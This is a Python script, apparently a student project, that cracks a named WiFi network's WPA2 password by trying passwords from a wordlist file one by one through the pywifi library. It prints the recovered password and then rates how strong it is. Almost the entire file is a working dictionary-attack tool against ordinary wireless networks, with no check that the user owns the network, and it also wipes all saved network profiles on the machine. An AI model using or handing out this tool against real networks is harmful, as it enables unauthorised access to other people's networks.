import time  # importing time library
import pywifi  # importing pywifi installed by using pip install pywifi and pip install comtypes
from pywifi import const
from asyncio.tasks import sleep

starttime = time.time()#to calculate the running time
profile2= pywifi.Profile()  # Create wifi link file
profile2.ssid = input(" Enter the name of the wifi: (caution: sensitive case)" )#the user enter the wifi name
#this function rate the wifi password
# if it is more than 8 characters and contain uppercase characters,lowercase characters,digits and symbols (strong password)
#if it is less than 8 characters and contain  uppercase characters,lowercase characters and digits only (moderate password)
#if it is not satisfied the conditions it consider as a week password
def passwordValidation(password1):
    Flag = False
    if (len(password1) >= 8):
        Flag = True

    LowerCase = False
    UpperCase = False
    Digites = False
    SpecialChar = False
    # SpecialSym = ['!@#$%^&*()_+']
    for i in password1:
        if (i.isupper()):
            UpperCase = True
        if (i.islower()):
            LowerCase = True
        if (i.isdigit()):
            Digites = True
        if (not i.isdigit() and not i.isalpha()):
            SpecialChar = True

    # checking the false
    if (Flag and LowerCase and UpperCase and Digites and SpecialChar):
        print(" The password of the network is Strong password, Good job!")
    elif (LowerCase and UpperCase and Digites and len(password1) >= 6):
        print(" The password of the network is moderate password, recommended to be changed")
    else:
        print(" The password of the network is weak, you should change it!!")


class WiFi_craker():
# this function open the file that contain the list of most common wifi passwords
    def __init__(self, path):
        self.file = open(path, "r", errors="ignore")
        wifi = pywifi.PyWiFi()  # access network interface
        self.iface = wifi.interfaces()[0]
        self.iface.disconnect()  # disconnect all the networks in the pc

        time.sleep(1)  # sleeping for one second

        # test if the network disconnect or not
        # assert statement is used to continue the execute if the given condition evaluates to True.
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
#this function try the password from the list one by one
# until it connect to the network successfully with the founded password
    def reading_password_list(self):
        print("    *** START CRAKING ***")
        while True:

            try:
                password = self.file.readline()
                if not password:
                    break
                findpassword = self.test_connect(password)
                if findpassword:
                    print(" CNOGRATS!, SUCCESSFUL CRACKING!!!  ")
                    print(" The password of the wifi is: ", password)
                    passwordValidation(password)
                    break
                else:
                    print(" Unfortunately, wrong password: ", password)
            except:
                continue


#this function for test the connection, more information will be provided line by line
    def test_connect(self, passwordsearch):  # link test

        profile = pywifi.Profile()  # Create wifi link file

        profile.ssid=profile2.ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi encryption algorithm
        profile.cipher = const.CIPHER_TYPE_CCMP  # Encryption unit
        profile.key = passwordsearch  # the password

        self.iface.remove_all_network_profiles()  # Delete all wifi files
        tmp_profile = self.iface.add_network_profile(profile)  # Set new link file
        self.iface.connect(tmp_profile)  # Link
        time.sleep(5)#sleeping for 5 seconds
        if self.iface.status() == const.IFACE_CONNECTED:  # Determine whether to connect or not
            successful = True
        else:
            successful = False
        self.iface.disconnect()  # disconnect
        time.sleep(1)
        # Check disconnection status
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return successful
#closing the file
    def __del__(self):
        self.file.close()

# create object from Wifi_cracker class
startcracking = WiFi_craker("password1.txt")
startcracking.reading_password_list()

end = time.time()
print(" Time taking to crack the wifi password: " , int(end - starttime) , "seconds")